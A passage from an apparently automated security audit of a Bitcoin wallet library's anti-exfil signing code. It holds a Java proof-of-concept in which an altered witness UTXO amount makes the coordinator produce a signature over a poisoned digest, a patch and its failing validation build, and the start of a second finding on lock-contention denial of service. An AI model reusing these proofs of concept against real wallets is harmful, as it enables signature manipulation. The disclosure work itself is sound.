        byte[] poisonedRaw = poisoned.serialize();

        List<AntiExfilSigningSlot> poisonedSlots = AntiExfilPsbt.enumerateSigningSlots(poisonedRaw, keystore);
        assertEquals(honestSlots.size(), poisonedSlots.size());
        assertArrayEquals(originalOutpoint, AntiExfilPsbt.parseCanonicalV0(poisonedRaw)
                .getTransaction().getInputs().getFirst().getOutpoint().bitcoinSerialize());
        assertArrayEquals(honestSlots.getFirst().getSignerPublicKey(), poisonedSlots.getFirst().getSignerPublicKey());
        assertNotEquals(Utils.bytesToHex(honestSlots.getFirst().getMessageHash()),
                Utils.bytesToHex(poisonedSlots.getFirst().getMessageHash()),
                "changing only the unbound witness amount changes the authoritative anti-exfil digest");

        AntiExfilCoordinator coordinator = AntiExfilCoordinator.create(temporary.resolve("poisoned.aexs"),
                temporary.resolve("poisoned.aexj"), poisonedRaw, keystore, AntiExfilNetwork.TESTNET4);
        AntiExfilMessage commit = AntiExfilCodec.decode(coordinator.getHostCommitMessage());
        byte[] openings = AntiExfilCodec.encode(new AntiExfilMessage(commit.getNetwork(), AntiExfilStage.SIGNER_OPENINGS,
                commit.getSessionId(), commit.getPsbtDigest(), signerOpenings(commit.getSlots())));
        AntiExfilMessage reveal = AntiExfilCodec.decode(coordinator.acceptOpenings(openings));
        byte[] signatureMessage = AntiExfilCodec.encode(new AntiExfilMessage(reveal.getNetwork(), AntiExfilStage.SIGNER_SIGNATURES,
                reveal.getSessionId(), reveal.getPsbtDigest(), signerSignatures(reveal.getSlots(), poisonedSlots, keystore)));

        AntiExfilCoordinator.Completion completion = coordinator.complete(signatureMessage);
        assertFalse(completion.isBroadcast());
        assertEquals(AntiExfilCoordinator.Phase.COMPLETE, coordinator.getStatus().getPhase());

        VerifiedAntiExfilSignature firstProof = completion.getVerifiedSignatures().stream()
                .filter(proof -> proof.getInputIndex() == 0)
                .findFirst().orElseThrow();
        assertArrayEquals(originalOutpoint, firstProof.getOutpoint(),
                "evidence is attached to the unchanged transaction input outpoint");
        assertArrayEquals(poisonedSlots.getFirst().getMessageHash(), firstProof.getMessageHash(),
                "evidence records the digest derived from the attacker-supplied witness amount");

        TransactionSignature attestedSignature = compactToTransactionSignature(firstProof.getCompactSignature());
        ECKey signer = ECKey.fromPublicOnly(firstProof.getSignerPublicKey());
        assertTrue(attestedSignature.verify(poisonedSlots.getFirst().getMessageHash(), signer));
        assertFalse(attestedSignature.verify(honestSlots.getFirst().getMessageHash(), signer),
                "the completed anti-exfil proof signs the poisoned amount digest, not the real coin digest");
    }

    private static List<AntiExfilSlot> signerOpenings(List<AntiExfilSlot> commitSlots) {
        List<AntiExfilSlot> openings = new ArrayList<>();
        for(int i = 0; i < commitSlots.size(); i++) {
            AntiExfilSlot slot = commitSlots.get(i);
            openings.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                    slot.getMessageHash(), slot.getCommitment(), openingForIndex(i), null, null));
        }
        return openings;
    }

    private static List<AntiExfilSlot> signerSignatures(List<AntiExfilSlot> revealSlots,
                                                         List<AntiExfilSigningSlot> semanticSlots,
                                                         Keystore keystore) throws Exception {
        List<AntiExfilSlot> signatures = new ArrayList<>();
        for(int i = 0; i < revealSlots.size(); i++) {
            AntiExfilSlot slot = revealSlots.get(i);
            ECKey privateKey = keystore.getExtendedMasterPrivateKey().getKey(semanticSlots.get(i).getKeyDerivation().getDerivation());
            assertArrayEquals(slot.getSignerPublicKey(), privateKey.getPubKey());
            byte[] compact = antiExfilSign(privateKey.getPrivKey(), openingSecretForIndex(i),
                    slot.getMessageHash(), slot.getHostRandomness(), slot.getOpening());
            assertTrue(AntiExfilCrypto.verify(slot.getSignerPublicKey(), slot.getMessageHash(),
                    slot.getHostRandomness(), slot.getOpening(), compact));
            signatures.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                    slot.getMessageHash(), slot.getCommitment(), slot.getOpening(), null, compact));
        }
        return signatures;
    }

    private static byte[] antiExfilSign(BigInteger privateKey, BigInteger openingSecret, byte[] messageHash,
                                        byte[] hostRandomness, byte[] opening) {
        BigInteger n = ECKey.CURVE.getN();
        BigInteger tweak = new BigInteger(1, Utils.taggedHash(POINT_TAG, Utils.concat(opening, hostRandomness)));
        BigInteger nonce = openingSecret.add(tweak).mod(n);
        ECPoint committedPoint = ECKey.CURVE.getCurve().decodePoint(opening)
                .add(ECKey.CURVE.getG().multiply(tweak)).normalize();
        BigInteger r = committedPoint.getAffineXCoord().toBigInteger().mod(n);
        BigInteger e = new BigInteger(1, messageHash);
        BigInteger s = nonce.modInverse(n).multiply(e.add(privateKey.multiply(r))).mod(n);
        if(s.compareTo(ECKey.HALF_CURVE_ORDER) > 0) s = n.subtract(s);
        return Utils.concat(toFixed32(r), toFixed32(s));
    }

    private static byte[] openingForIndex(int index) {
        return ECKey.fromPrivate(openingSecretForIndex(index), true).getPubKey();
    }

    private static BigInteger openingSecretForIndex(int index) {
        return BigInteger.valueOf(1000L + index);
    }

    private static TransactionSignature compactToTransactionSignature(byte[] compact) {
        BigInteger r = new BigInteger(1, Arrays.copyOfRange(compact, 0, 32));
        BigInteger s = new BigInteger(1, Arrays.copyOfRange(compact, 32, 64));
        return new TransactionSignature(new ECDSASignature(r, s), SigHash.ALL);
    }

    private static byte[] toFixed32(BigInteger value) {
        byte[] raw = value.toByteArray();
        byte[] fixed = new byte[32];
        int copyLength = Math.min(raw.length, 32);
        System.arraycopy(raw, raw.length - copyLength, fixed, 32 - copyLength, copyLength);
        return fixed;
    }

    private static String loadVector(String resource) throws IOException {
        try(InputStream stream = Poc.class.getResourceAsStream(resource)) {
            assertNotNull(stream, "Missing test vector " + resource);
            return new String(stream.readAllBytes(), StandardCharsets.UTF_8);
        }
    }

    private static String field(String vector, String name) {
        Matcher matcher = Pattern.compile(STRING_FIELD.pattern().formatted(Pattern.quote(name))).matcher(vector);
        assertTrue(matcher.find(), "Missing vector field " + name);
        return matcher.group(1);
    }

    private static Keystore keystore() throws Exception {
        DeterministicSeed seed = new DeterministicSeed(WORDS, "", 0, DeterministicSeed.Type.BIP39);
        return Keystore.fromSeed(seed, PolicyType.SINGLE_HD, KeyDerivation.parsePath("m/84'/1'/0'"));
    }
}
```
### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   src/test/java/com/sparrowwallet/drongo/antiexfil/Poc.java

# build and run
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew testClasses
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew test --tests 'com.sparrowwallet.drongo.antiexfil.Poc'
```
### Output

```
[output truncated: 20 lines & 0.7431640625 KB skipped]
> Task :processResources UP-TO-DATE
> Task :classes UP-TO-DATE
> Task :compileTestJava UP-TO-DATE
> Task :processTestResources UP-TO-DATE
> Task :testClasses UP-TO-DATE
> Task :test

BUILD SUCCESSFUL in 2s
5 actionable tasks: 1 executed, 4 up-to-date
Consider enabling configuration cache to speed up this build: https://docs.gradle.org/9.1.0/userguide/configuration_cache_enabling.html
```
### Considerations

PoC uses the scoped JUnit unit harness and the repository's protocol-v1 semantic fixture as the stand-in for the real coin context. It demonstrates native execution of AntiExfilPsbt.enumerateSigningSlots(), AntiExfilCoordinator.create(), acceptOpenings(), and complete() over a PSBT whose first input has no non-witness UTXO and whose standalone witness UTXO amount is altered. The test proves coordinator completion and verified evidence bind the unchanged outpoint to the poisoned digest, and that the resulting attested signature verifies for the poisoned amount digest but fails for the original fixture digest. It does not connect to a Bitcoin node or broadcast; unbroadcastability is shown by signature verification failure against the original/real UTXO amount digest.
### Validation reasoning

PoC validation command completed successfully.
## Remediation
### Explanation

Require every anti-exfil signing input to include a non-witness UTXO, the only UTXO representation whose previous transaction hash is verified against the input outpoint, before classifying scripts or deriving the authoritative signing hash.
### Patch

```diff
diff --git a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilPsbt.java b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilPsbt.java
--- a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilPsbt.java
+++ b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilPsbt.java
@@ -1,254 +1,254 @@
 package com.sparrowwallet.drongo.antiexfil;
 
 import com.sparrowwallet.drongo.KeyDerivation;
 import com.sparrowwallet.drongo.crypto.ECDSASignature;
 import com.sparrowwallet.drongo.crypto.ECKey;
 import com.sparrowwallet.drongo.protocol.Script;
 import com.sparrowwallet.drongo.protocol.ScriptChunk;
 import com.sparrowwallet.drongo.protocol.ScriptOpCodes;
 import com.sparrowwallet.drongo.protocol.ScriptType;
 import com.sparrowwallet.drongo.protocol.Sha256Hash;
 import com.sparrowwallet.drongo.protocol.SigHash;
 import com.sparrowwallet.drongo.protocol.TransactionSignature;
 import com.sparrowwallet.drongo.psbt.PSBT;
 import com.sparrowwallet.drongo.psbt.PSBTInput;
 import com.sparrowwallet.drongo.psbt.PSBTParseException;
 import com.sparrowwallet.drongo.wallet.Keystore;
 
 import java.math.BigInteger;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.HashSet;
 import java.util.LinkedHashMap;
 import java.util.List;
 import java.util.Map;
 import java.util.Set;
 
 import static com.sparrowwallet.drongo.antiexfil.AntiExfilException.Code.*;
 
 public final class AntiExfilPsbt {
     private AntiExfilPsbt() {
     }
 
     public static PSBT parseCanonicalV0(byte[] raw) {
         if(raw == null || raw.length < 5 || raw[0] != 'p' || raw[1] != 's' || raw[2] != 'b' || raw[3] != 't' || raw[4] != (byte)0xff) {
             throw fail(INVALID_MESSAGE, "Invalid PSBT magic");
         }
         try {
             PSBT psbt = new PSBT(raw, false);
             if(psbt.getVersion() != null && psbt.getVersion() != 0) {
                 throw fail(INVALID_MESSAGE, "Protocol v1 accepts PSBT v0 only");
             }
             if(!Arrays.equals(raw, psbt.serialize())) {
                 throw fail(INVALID_MESSAGE, "PSBT is not canonically encoded");
             }
             if(psbt.getTransaction() == null || psbt.getPsbtInputs().isEmpty() || psbt.getPsbtOutputs().isEmpty()) {
                 throw fail(INVALID_MESSAGE, "PSBT requires an unsigned transaction");
             }
             return psbt;
         } catch(PSBTParseException | RuntimeException e) {
             if(e instanceof AntiExfilException antiExfilException) throw antiExfilException;
             throw new AntiExfilException(INVALID_MESSAGE, "Invalid PSBT: " + e.getMessage(), e);
         }
     }
 
     public static List<AntiExfilSigningSlot> enumerateSigningSlots(byte[] raw, Keystore keystore) {
         if(keystore == null || keystore.getKeyDerivation() == null || keystore.getExtendedPublicKey() == null) {
             throw fail(INVALID_MESSAGE, "A public account keystore is required");
         }
         PSBT psbt = parseCanonicalV0(raw);
         List<AntiExfilSigningSlot> slots = new ArrayList<>();
         for(int index = 0; index < psbt.getPsbtInputs().size(); index++) {
             PSBTInput input = psbt.getPsbtInputs().get(index);
             failOnTaproot(index, input);
-            if(input.getUtxo() == null) failInput(index, "missing UTXO data");
+            if(input.getNonWitnessUtxo() == null) failInput(index, "missing txid-bound non-witness UTXO data");
             ScriptClassification classification = classify(index, input);
             SigHash sigHash = input.getSigHash() == null ? SigHash.ALL : input.getSigHash();
             if(sigHash != SigHash.ALL) failInput(index, "protocol v1 supports only explicit SIGHASH_ALL");
             validateDerivations(index, input, classification.signingKeys());
             byte[] messageHash;
             try {
                 messageHash = input.getSigningHash().getBytes();
             } catch(RuntimeException e) {
                 throw new AntiExfilException(SIGNATURE_SLOT_MISMATCH, "Input " + index + ": cannot derive sighash", e);
             }
             for(Map.Entry<ECKey, KeyDerivation> entry : input.getDerivedPublicKeys().entrySet()) {
                 ECKey publicKey = entry.getKey();
                 KeyDerivation derivation = entry.getValue();
                 if(!classification.signingKeys().contains(publicKey)
                         || !keystore.getKeyDerivation().getMasterFingerprint().equals(derivation.getMasterFingerprint())) continue;
                 ECKey expected = keystore.getPubKeyForDerivation(derivation);
                 if(expected == null || !Arrays.equals(expected.getPubKey(), publicKey.getPubKey())) {
                     failInput(index, "BIP32 path does not derive its declared public key");
                 }
                 if(input.getPartialSignatures().containsKey(publicKey)) {
                     throw fail(UNEXPECTED_RETURN_DATA, "Input " + index + " already has a controlled signature");
                 }
                 if(input.isFinalized()) continue;
                 slots.add(new AntiExfilSigningSlot(index, publicKey.getPubKey(), messageHash,
                         AntiExfilCodec.SIGHASH_ALL, derivation, classification.kind()));
             }
         }
         slots.sort((left, right) -> left.getIdentifier().compareTo(right.getIdentifier()));
         if(slots.isEmpty()) throw fail(SIGNATURE_SLOT_MISMATCH, "PSBT has no controlled signing slots");
         if(slots.size() > AntiExfilCodec.MAX_SLOTS) throw fail(SIGNATURE_SLOT_MISMATCH, "PSBT exceeds the global slot limit");
         Set<AntiExfilSigningSlot.Identifier> identifiers = new HashSet<>();
         Map<Integer, Integer> perInput = new LinkedHashMap<>();
         for(AntiExfilSigningSlot slot : slots) {
             if(!identifiers.add(slot.getIdentifier())) throw fail(SIGNATURE_SLOT_MISMATCH, "Duplicate signing slot");
             int count = perInput.merge(slot.getInputIndex(), 1, Integer::sum);
             if(count > AntiExfilCodec.MAX_SLOTS_PER_INPUT) failInput(slot.getInputIndex(), "input exceeds the per-input slot limit");
         }
         return List.copyOf(slots);
     }
 
     public static AntiExfilMessage buildHostCommitMessage(byte[] raw, Keystore keystore, AntiExfilNetwork network,
                                                            byte[] sessionId,
                                                            Map<AntiExfilSigningSlot.Identifier, byte[]> hostRandomness) {
         List<AntiExfilSigningSlot> semantic = enumerateSigningSlots(raw, keystore);
         Set<AntiExfilSigningSlot.Identifier> expected = new HashSet<>();
         semantic.forEach(slot -> expected.add(slot.getIdentifier()));
         if(hostRandomness == null || !hostRandomness.keySet().equals(expected)) {
             throw fail(SIGNATURE_SLOT_MISMATCH, "Host randomness must cover the exact slot set");
         }
         Set<ByteArray> uniqueRandomness = new HashSet<>();
         List<AntiExfilSlot> records = new ArrayList<>();
         for(AntiExfilSigningSlot slot : semantic) {
             byte[] rho = hostRandomness.get(slot.getIdentifier());
             if(rho == null || rho.length != 32 || !uniqueRandomness.add(new ByteArray(rho))) {
                 throw fail(COMMITMENT_MISMATCH, "Host randomness must be valid and unique per slot");
             }
             records.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                     slot.getMessageHash(), AntiExfilCrypto.hostCommit(rho), null, null, null));
         }
         AntiExfilMessage message = new AntiExfilMessage(network, AntiExfilStage.HOST_COMMIT, sessionId, Sha256Hash.hash(raw), records);
         AntiExfilCodec.validate(message);
         return message;
     }
 
     public static byte[] reconstructSignedPsbt(byte[] original, Keystore keystore, AntiExfilMessage commit,
                                                AntiExfilMessage signatures,
                                                Map<AntiExfilSigningSlot.Identifier, byte[]> hostRandomness) {
         List<AntiExfilSigningSlot> semantic = enumerateSigningSlots(original, keystore);
         Set<AntiExfilSigningSlot.Identifier> expectedIdentifiers = new HashSet<>();
         semantic.forEach(slot -> expectedIdentifiers.add(slot.getIdentifier()));
         if(hostRandomness == null || !hostRandomness.keySet().equals(expectedIdentifiers)) {
             throw fail(SIGNATURE_SLOT_MISMATCH, "Stored host randomness differs from the authoritative slot set");
         }
         AntiExfilCodec.validate(commit);
         AntiExfilCodec.validate(signatures);
         if(commit == null || commit.getStage() != AntiExfilStage.HOST_COMMIT
                 || !Arrays.equals(commit.getPsbtDigest(), Sha256Hash.hash(original))
                 || commit.getSlots().size() != semantic.size()) {
             throw fail(TRANSACTION_MISMATCH, "Commit message is not authoritative for the PSBT");
         }
         if(signatures == null || signatures.getStage() != AntiExfilStage.SIGNER_SIGNATURES) {
             throw fail(WRONG_STAGE, "Expected signer-signatures message");
         }
         if(signatures.getNetwork() != commit.getNetwork()
                 || !Arrays.equals(signatures.getSessionId(), commit.getSessionId())
                 || !Arrays.equals(signatures.getPsbtDigest(), commit.getPsbtDigest())
                 || signatures.getSlots().size() != semantic.size()) {
             throw fail(TRANSACTION_MISMATCH, "Signature response context changed");
         }
         PSBT reconstructed = parseCanonicalV0(original);
         for(int i = 0; i < semantic.size(); i++) {
             AntiExfilSigningSlot authoritative = semantic.get(i);
             AntiExfilSlot before = commit.getSlots().get(i);
             AntiExfilSlot after = signatures.getSlots().get(i);
             byte[] rho = hostRandomness == null ? null : hostRandomness.get(authoritative.getIdentifier());
             requireSlot(authoritative, before);
             requireSlot(authoritative, after);
             if(!Arrays.equals(before.getCommitment(), after.getCommitment()) || rho == null
                     || !Arrays.equals(AntiExfilCrypto.hostCommit(rho), before.getCommitment())) {
                 throw fail(COMMITMENT_MISMATCH, "Stored randomness or response commitment changed");
             }
             if(!AntiExfilCrypto.verify(after.getSignerPublicKey(), after.getMessageHash(), rho,
                     after.getOpening(), after.getSignature())) {
                 throw fail(SIGNATURE_INVALID, "Anti-exfil signature verification failed");
             }
             byte[] compact = after.getSignature();
             BigInteger r = new BigInteger(1, Arrays.copyOfRange(compact, 0, 32));
             BigInteger s = new BigInteger(1, Arrays.copyOfRange(compact, 32, 64));
             TransactionSignature signature = new TransactionSignature(new ECDSASignature(r, s), SigHash.ALL);
             reconstructed.getPsbtInputs().get(authoritative.getInputIndex()).getPartialSignatures()
                     .put(ECKey.fromPublicOnly(authoritative.getSignerPublicKey()), signature);
         }
         return reconstructed.serialize();
     }
 
     private static void requireSlot(AntiExfilSigningSlot authoritative, AntiExfilSlot record) {
         if(record.getInputIndex() != Integer.toUnsignedLong(authoritative.getInputIndex())
                 || record.getSighashType() != AntiExfilCodec.SIGHASH_ALL
                 || !Arrays.equals(record.getSignerPublicKey(), authoritative.getSignerPublicKey())
                 || !Arrays.equals(record.getMessageHash(), authoritative.getMessageHash())) {
             throw fail(SIGNATURE_SLOT_MISMATCH, "Protocol slot differs from authoritative PSBT semantics");
         }
     }
 
     private static ScriptClassification classify(int index, PSBTInput input) {
         ScriptType type = input.getScriptType();
         if(type == ScriptType.P2WPKH || type == ScriptType.P2SH_P2WPKH) {
             Script program = type == ScriptType.P2WPKH ? input.getUtxo().getScript() : input.getRedeemScript();
             if(program == null || !ScriptType.P2WPKH.isScriptType(program)) failInput(index, "inconsistent P2WPKH script");
             List<ECKey> matches = input.getDerivedPublicKeys().keySet().stream()
                     .filter(key -> ScriptType.P2WPKH.getOutputScript(key.getPubKeyHash()).equals(program)).toList();
             if(matches.size() != 1) failInput(index, "P2WPKH requires exactly one matching BIP32 public key");
             return new ScriptClassification(type == ScriptType.P2WPKH ? "p2wpkh" : "p2sh-p2wpkh", Set.copyOf(matches));
         }
         if(type == ScriptType.P2WSH || type == ScriptType.P2SH_P2WSH) {
             Script witnessScript = input.getWitnessScript();
             if(witnessScript == null || !ScriptType.MULTISIG.isScriptType(witnessScript)) failInput(index, "witness script is not standard multisig");
             List<ScriptChunk> chunks = witnessScript.getChunks();
             if(!chunks.getLast().equalsOpCode(ScriptOpCodes.OP_CHECKMULTISIG)) failInput(index, "witness script must end in CHECKMULTISIG");
             ECKey[] keys;
             try {
                 keys = ScriptType.MULTISIG.getPublicKeysFromScript(witnessScript);
                 if(ScriptType.MULTISIG.getThreshold(witnessScript) > keys.length) failInput(index, "multisig threshold exceeds key count");
                 for(int i = 1; i < chunks.size() - 2; i++) {
                     if(chunks.get(i).getOpcode() != 33 || chunks.get(i).getData() == null || chunks.get(i).getData().length != 33) {
                         failInput(index, "multisig keys must use canonical compressed pushes");
                     }
                 }
             } catch(RuntimeException e) {
                 throw new AntiExfilException(SIGNATURE_SLOT_MISMATCH, "Input " + index + ": invalid multisig script", e);
             }
             Set<ECKey> unique = new HashSet<>(Arrays.asList(keys));
             if(unique.size() != keys.length) failInput(index, "multisig public keys must be unique");
             String kind = type == ScriptType.P2WSH ? "p2wsh-multisig" : "p2sh-p2wsh-multisig";
             return new ScriptClassification(kind, Set.copyOf(unique));
         }
         failInput(index, "unsupported or inconsistent script type " + type);
         throw new AssertionError();
     }
 
     private static void validateDerivations(int index, PSBTInput input, Set<ECKey> signingKeys) {
         Set<ECKey> seen = new HashSet<>();
         for(Map.Entry<ECKey, KeyDerivation> entry : input.getDerivedPublicKeys().entrySet()) {
             if(!seen.add(entry.getKey()) || !signingKeys.contains(entry.getKey())
                     || entry.getValue() == null || entry.getValue().getMasterFingerprint() == null
                     || entry.getValue().getMasterFingerprint().length() != 8) {
                 failInput(index, "invalid, duplicate, or script-foreign BIP32 derivation");
             }
         }
     }
 
     private static void failOnTaproot(int index, PSBTInput input) {
         if(input.isTaproot() || input.getTapInternalKey() != null || input.getTapKeyPathSignature() != null
                 || !input.getTapDerivedPublicKeys().isEmpty()) failInput(index, "Taproot data is unsupported");
     }
 
     private static void failInput(int index, String message) {
         throw fail(SIGNATURE_SLOT_MISMATCH, "Input " + index + ": " + message);
     }
 
     private static AntiExfilException fail(AntiExfilException.Code code, String message) {
         return new AntiExfilException(code, message);
     }
 
     private record ScriptClassification(String kind, Set<ECKey> signingKeys) {}
     private record ByteArray(byte[] value) {
         @Override public boolean equals(Object object) { return object instanceof ByteArray other && Arrays.equals(value, other.value); }
         @Override public int hashCode() { return Arrays.hashCode(value); }
     }
 }
```
### Affected files
- `src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilPsbt.java`
### Validation output

```
[output truncated: 27 lines & 0.8095703125 KB skipped]
FAILURE: Build failed with an exception.

* What went wrong:
Execution failed for task ':test'.
> There were failing tests. See the report at: file:///repo/build/reports/tests/test/index.html

* Try:
> Run with --scan to generate a Build Scan (Powered by Develocity).

BUILD FAILED in 1s
```

---

# Same-JVM contention aborts coordinator operations
**#247998**
- Severity: Medium
- Validity: Unreviewed
## Source locations
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilDurableFiles.java`
#### Lines 24-38 — _The lock acquisition is wrapped only by an IOException handler._

```
    static <T> T locked(Path target, IOAction<T> action) {
        try {
            Path absolute = target.toAbsolutePath();
            Path parent = absolute.getParent();
            if(parent == null) throw new IOException("Durable state requires a parent directory");
            Files.createDirectories(parent);
            Path lockPath = parent.resolve(absolute.getFileName() + ".lock");
            try(FileChannel channel = FileChannel.open(lockPath, StandardOpenOption.CREATE, StandardOpenOption.WRITE);
                FileLock ignored = channel.lock()) {
                return action.run();
            }
        } catch(IOException e) {
            throw new AntiExfilException(AntiExfilException.Code.STATE_INVALID,
                    "Cannot access durable anti-exfil state: " + e.getMessage(), e);
        }
```
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java` (2 locations)
#### Lines 93-122 — _Public load, getters, and opening acceptance reach the vulnerable lock._

```
    public static AntiExfilCoordinator load(Path sessionPath, Path journalPath, Keystore keystore) {
        AntiExfilCoordinator coordinator = new AntiExfilCoordinator(sessionPath, journalPath, keystore);
        coordinator.readValidatedState();
        new AntiExfilAbortJournal(journalPath, coordinator.walletIdentity).getEvents();
        return coordinator;
    }

    public byte[] getHostCommitMessage() {
        return readValidatedState().message1.clone();
    }

    public byte[] getFrozenPsbt() {
        return readValidatedState().originalPsbt.clone();
    }

    public byte[] getHostRevealMessage() {
        State state = readValidatedState();
        if(state.phase == Phase.COMMITMENTS_CREATED) throw fail(WRONG_STAGE, "Signer openings have not been accepted");
        return state.message3.clone();
    }

    public Completion getCompletedResult() {
        State state = readValidatedState();
        if(state.phase != Phase.COMPLETE) throw fail(WRONG_STAGE, "Coordinator session is not complete");
        return completion(state);
    }

    public byte[] acceptOpenings(byte[] encodedOpenings) {
        if(encodedOpenings == null) throw fail(INVALID_MESSAGE, "Signer openings are required");
        return AntiExfilDurableFiles.locked(sessionPath, () -> {
```
⋯
#### Lines 152-171 — _Completion also holds the same session lock._

```
    public Completion complete(byte[] encodedSignatures) {
        if(encodedSignatures == null) throw fail(INVALID_MESSAGE, "Signer signatures are required");
        return AntiExfilDurableFiles.locked(sessionPath, () -> {
            State state = readValidatedStateUnlocked();
            if(state.phase == Phase.COMMITMENTS_CREATED) throw fail(WRONG_STAGE, "Cannot complete before accepting openings");
            if(state.phase == Phase.COMPLETE) {
                if(!Arrays.equals(encodedSignatures, state.message4)) throw fail(RETRY_CONFLICT, "Completed session received different signatures");
                return completion(state);
            }
            AntiExfilMessage reveal = AntiExfilCodec.decode(state.message3);
            AntiExfilMessage signatures = AntiExfilCodec.decode(encodedSignatures);
            if(signatures.getStage() != AntiExfilStage.SIGNER_SIGNATURES) throw fail(WRONG_STAGE, "Expected signer signatures");
            AntiExfilCodec.validateTransition(reveal, signatures);
            byte[] signed = AntiExfilPsbt.reconstructSignedPsbt(state.originalPsbt, keystore,
                    AntiExfilCodec.decode(state.message1), signatures, state.rhos);
            State complete = new State(Phase.COMPLETE, state.walletIdentity, state.originalPsbt,
                    state.message1, state.message2, state.message3, encodedSignatures, signed, state.rhos);
            AntiExfilDurableFiles.write(sessionPath, encode(complete), false);
            return completion(complete);
        });
```
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilAbortJournal.java`
#### Lines 35-57 — _Journal reads and appends use the same helper._

```
    public List<AbortEvent> getEvents() {
        return AntiExfilDurableFiles.locked(path, () -> List.copyOf(loadOrCreate().events));
    }

    AbortEvent append(byte[] sessionId, byte[] psbtDigest, String reason) {
        if(sessionId == null || sessionId.length != 32 || psbtDigest == null || psbtDigest.length != 32) {
            throw new AntiExfilException(AntiExfilException.Code.STATE_INVALID, "Invalid abort event context");
        }
        byte[] reasonBytes = reason == null ? new byte[0] : reason.strip().getBytes(StandardCharsets.UTF_8);
        if(reasonBytes.length == 0 || reasonBytes.length > MAX_REASON_BYTES) {
            throw new AntiExfilException(AntiExfilException.Code.STATE_INVALID,
                    "Abort reason must contain 1 to " + MAX_REASON_BYTES + " UTF-8 bytes");
        }
        return AntiExfilDurableFiles.locked(path, () -> {
            Journal journal = loadOrCreate();
            if(journal.events.size() >= MAX_EVENTS) throw new IOException("Abort journal is full");
            AbortEvent event = new AbortEvent(sessionId, psbtDigest, Instant.now().getEpochSecond(),
                    new String(reasonBytes, StandardCharsets.UTF_8));
            List<AbortEvent> updated = new ArrayList<>(journal.events);
            updated.add(event);
            AntiExfilDurableFiles.write(path, encode(new Journal(walletIdentity, updated)), false);
            return event;
        });
```
## Description

`AntiExfilDurableFiles.locked` relies on `FileChannel.lock()` as its only serializer and catches only `IOException`. Java throws the unchecked `OverlappingFileLockException` rather than blocking when another channel in the same JVM holds an overlapping lock. Concurrent calls on the same coordinator or shared journal therefore fail immediately before their action runs and escape as an unexpected runtime exception. Public load, getters, state transitions, abort recording, status, and journal reads all reach this helper. Repeated overlapping requests can sustain the failure while state remains otherwise valid.
## Root cause

The helper assumes OS-level blocking semantics cover same-JVM contenders and has no JVM-local mutex, retry, or exception translation for overlapping locks.
## Impact

Concurrent in-process requests can cause reversible denial of service across a signing session or all sessions sharing a wallet journal. The losing operation remains fail-closed, but integrations expecting `AntiExfilException` can also lose their normal error handling.
## Proof of concept
### Test case

```
package com.sparrowwallet.drongo.antiexfil;

import com.sparrowwallet.drongo.ExtendedKey;
import com.sparrowwallet.drongo.KeyDerivation;
import com.sparrowwallet.drongo.Utils;
import com.sparrowwallet.drongo.crypto.ECKey;
import com.sparrowwallet.drongo.policy.PolicyType;
import com.sparrowwallet.drongo.wallet.DeterministicSeed;
import com.sparrowwallet.drongo.wallet.Keystore;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.InputStream;
import java.nio.channels.OverlappingFileLockException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Path;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static org.junit.jupiter.api.Assertions.assertArrayEquals;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Dedicated, package-scoped PoC slot for anti-exfil security reproductions.
 */
class Poc {
    private static final String WORDS = "model ensure search plunge galaxy firm exclude brain satoshi meadow cable roast";
    private static final Pattern STRING_FIELD = Pattern.compile("\\\"%s\\\"\\s*:\\s*\\\"([0-9a-f]+)\\\"");

    @TempDir
    Path temporary;

    @Test
    void sameJvmContentionAbortsPublicCoordinatorReadsWithUncheckedLockException() throws Exception {
        byte[] original = Utils.hexToBytes(field(loadVector("protocol-v1-semantic-psbt-vector.json"), "psbt_hex"));
        Keystore keystore = keystore();
        Path session = temporary.resolve("shared-session.aexs");
        Path journal = temporary.resolve("shared-wallet.aexj");
        AntiExfilCoordinator coordinator = AntiExfilCoordinator.create(session, journal, original, keystore,
                AntiExfilNetwork.TESTNET4);
        byte[] commitBeforeContention = coordinator.getHostCommitMessage();

        CountDownLatch firstPublicLoadHoldingSessionLock = new CountDownLatch(1);
        CountDownLatch releaseFirstPublicLoad = new CountDownLatch(1);
        Keystore blockingKeystore = blockingKeystore(keystore, firstPublicLoadHoldingSessionLock, releaseFirstPublicLoad);
        ExecutorService executor = Executors.newFixedThreadPool(2);
        try {
            Future<AntiExfilCoordinator> longRunningPublicLoad = executor.submit(() ->
                    AntiExfilCoordinator.load(session, journal, blockingKeystore));

            assertTrue(firstPublicLoadHoldingSessionLock.await(5, TimeUnit.SECONDS),
                    "public load did not reach validation while holding the session lock");

            Future<Throwable> overlappingPublicRead = executor.submit(() -> {
                try {
                    coordinator.getHostCommitMessage();
                    return null;
                } catch(Throwable t) {
                    return t;
                }
            });

            Throwable thrown = overlappingPublicRead.get(5, TimeUnit.SECONDS);
